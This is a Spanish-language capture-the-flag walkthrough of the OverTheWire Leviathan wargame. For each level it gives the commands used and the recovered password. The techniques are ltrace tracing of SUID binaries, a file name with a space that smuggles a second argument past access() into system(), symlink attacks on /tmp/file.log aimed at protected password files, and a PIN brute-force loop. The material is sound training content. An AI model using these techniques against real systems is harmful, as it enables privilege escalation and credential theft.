# Leviathan

## Leviathan 0

El nivel funciona como calentamiento y prueba de acceso al entorno. La contraseña no estaba protegida por binarios o permisos restrictivos, sino simplemente ofuscada por "seguridad por oscuridad" dentro de un directorio oculto (.backup) y enterrada en un archivo de marcadores HTML extenso.

```bash
# 1. Listar todos los archivos, incluyendo ocultos, en el directorio home
ls -la

# 2. Acceder al directorio de respaldo oculto
cd .backup

# 3. Filtrar el archivo HTML buscando palabras clave
grep "pass" bookmarks.html

```
Contraseña para Leviathan 1: **PiXaSWQqHq**

## Leviathan 1

El nivel presentaba un único ejecutable ./check que solicitaba una contraseña. Un análisis estático inicial con strings reveló funciones críticas (como strcmp y system("/bin/sh")), pero no expuso la contraseña real debido a que su longitud (3 caracteres) era inferior al filtro por defecto de la herramienta.
Ante la falta de código fuente, la mejor aproximación es el análisis dinámico para observar el comportamiento del binario en tiempo de ejecución.

Se utilizó el depurador ltrace para interceptar y registrar las llamadas a librerías dinámicas que realiza el ejecutable. Al ingresar un input de prueba, se capturó la llamada a la función de comparación de cadenas (strcmp), 
la cual expuso la contraseña real en texto plano. Tras introducir la clave correcta, el binario ejecutó una shell (/bin/sh) heredando los privilegios SUID, permitiendo leer la flag del siguiente nivel.

```bash
# 1. Ejecutar el binario a través de ltrace para observar llamadas a librerías
ltrace ./check

# 2. Identificar la comparación de credenciales en el output
# strcmp(" \n\n", "sex") = -1

# 3. Ejecutar el binario de forma estándar e ingresar la clave descubierta ("sex")
./check

# 4. Leer la flag con los privilegios elevados en la nueva shell
cat /etc/leviathan_pass/leviathan2
```
Contraseña Leviathan 2: **ERJ9jTYWXE**

## Leviathan 2
El análisis dinámico con strace y la revisión de cadenas con strings revelaron el flujo del programa: primero verifica los permisos del usuario sobre un archivo usando access(), y luego lo imprime ejecutando system("/bin/cat [archivo]"). 
La vulnerabilidad reside en que access() interpreta un nombre con espacios como una única cadena literal, mientras que /bin/sh (invocado por system()) utiliza los espacios como delimitadores de argumentos.

Se creó un archivo con un espacio en el nombre para superar la validación de access(). Simultáneamente, se creó un enlace simbólico (symlink) con la segunda mitad del nombre apuntando a la credencial objetivo. 
Al pasar el nombre completo con espacios, la shell dividió la entrada, forzando al comando cat a leer el symlink con los privilegios elevados del binario SUID.

```bash
# 1. Crear entorno de trabajo temporal
mkdir /tmp/cuervo_lev2 && cd /tmp/cuervo_lev2

# 2. Crear archivo señuelo con espacio en el nombre para engañar a access()
touch "trampa clave"

# 3. Crear enlace simbólico apuntando a la flag objetivo
ln -s /etc/leviathan_pass/leviathan3 clave

# 4. Ejecutar el binario vulnerable con el archivo señuelo
~/printfile "trampa clave"

# Resultado: La shell ejecuta `cat trampa clave`, fallando en 'trampa' pero leyendo con éxito el symlink 'clave'.
```

Contraseña para Leviathan 3: **PiEpxxknZH**

## Leviathan 3

El análisis estático inicial con strings sobre el binario ./level3 reveló múltiples posibles contraseñas (kaka, secret, bomb). Para evitar el ensayo y error y determinar la lógica real de validación, se recurrió a la depuración con ltrace. El trazado demostró que las credenciales evidentes actuaban como señuelos, y la función strcmp validaba el input del usuario contra la cadena snlprintf.

```bash
# 1. Rastrear las llamadas a librerías del binario
ltrace ./level3

# 2. Identificar la comparación real en el output (se usó "secret" como prueba)
# strcmp("secret\n", "snlprintf\n") = -1

# 3. Ejecutar el binario e ingresar la contraseña verdadera para spawnear la shell
./level3
# Enter the password> snlprintf
# [You've got shell]!

# 4. Leer la flag del siguiente nivel
cat /etc/leviathan_pass/leviathan4
```

Contraseña Leviathan 4: **XIyBbRwAPt**

## Leviathan 4
La inspección con strings sobre el ejecutable oculto en .trash/bin evidenció una llamada directa al archivo protegido de contraseñas de leviathan5. Al ejecutar el programa, se comprobó que no evalúa entradas de usuario (inputs), sino que actúa como un conversor de caracteres, iterando sobre el contenido del archivo de la contraseña y transformando su valor ASCII a bloques de 8 bits.

Se ejecutó el binario y se capturó la salida binaria. La secuencia resultante fue decodificada utilizando un conversor de binario a ASCII para revertir la ofuscación y recuperar la credencial en texto plano.

```bash
# 1. Localizar y ejecutar el binario oculto en el directorio .trash
~/.trash/bin
# Salida: 01000010 01110101 01100010 00111001 01100111 01011010 00110011 01000010 01000111 01010101 00001010

# 2. Traducir los bloques de 8 bits a texto ASCII estándar
# Resultado de decodificación: Bub9gZ3BGU
```

Contraseña para Leviathan 5: **Bub9gZ3BGU**

## Leviathan 5

El análisis estático con strings reveló la anatomía del ejecutable: busca abrir /tmp/file.log (fopen), asume la identidad del propietario (setuid), lee e imprime su contenido carácter por carácter (fgetc, putchar), y finalmente elimina el archivo (unlink). Al carecer de validaciones sobre la naturaleza del archivo en /tmp/, el binario es susceptible a un ataque de enlace simbólico.

Se manipuló el entorno de ejecución creando un enlace simbólico en la ruta exacta requerida por el programa, apuntando hacia el archivo de credenciales protegido. Al ejecutar el binario, este utilizó sus privilegios elevados para seguir el enlace e imprimir la flag del siguiente nivel antes de ejecutar su rutina de autodestrucción (unlink).

```bash
# 1. Limpiar el entorno compartido de posibles archivos previos
rm -f /tmp/file.log

# 2. Crear un enlace simbólico en la ruta estática esperada por el binario
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

# 3. Ejecutar el binario vulnerable
./leviathan5
# Resultado: El programa SUID sigue el symlink y revela la contraseña objetivo.
```

Contraseña para Leviathan 6: **JRGj9iWNOb**

## Leviathan 6
El ejecutable ./leviathan6 solicita un código numérico de 4 dígitos como argumento. Al determinar que el espacio de claves es extremadamente reducido (10.000 combinaciones, de 0000 a 9999) y verificar la ausencia de mecanismos de mitigación (como rate limiting o bloqueos por múltiples intentos fallidos), se establece que la explotación óptima es la automatización del ataque.

Se estructuró un bucle one-liner en Bash para iterar sobre el espacio completo de claves, inyectando secuencialmente cada valor como argumento del binario. Al coincidir el PIN, el programa interrumpe el bucle cediendo una shell interactiva con privilegios elevados.

```bash
# Iteración automatizada del espacio de claves (0000-9999)
for i in {0000..9999}; do ./leviathan6 $i; done

# Al acertar el PIN, el binario otorga la shell SUID para leer la flag
cat /etc/leviathan_pass/leviathan7
```

Contraseña para Leviathan 7: **3zrlkaPTfH**

## Leviathan 7

**A diferencia de Bandit, que está orientado a la administración del sistema operativo, la progresión a través de Leviathan estableció fundamentos críticos de Ingeniería Inversa, Análisis de Binarios SUID y Depuración. Se dominaron herramientas de trazado de llamadas al sistema y librerías (ltrace, strace, strings) para realizar análisis dinámico y estático de ejecutables sin código fuente. Además, se explotaron vulnerabilidades de diseño en aplicaciones C, incluyendo inyección de argumentos en la consola y manipulación de enlaces simbólicos (symlinks) para evadir funciones de validación como access(). Estas competencias proporcionan una base analítica sólida para la disección de artefactos sospechosos y operaciones avanzadas de Threat Hunting.**
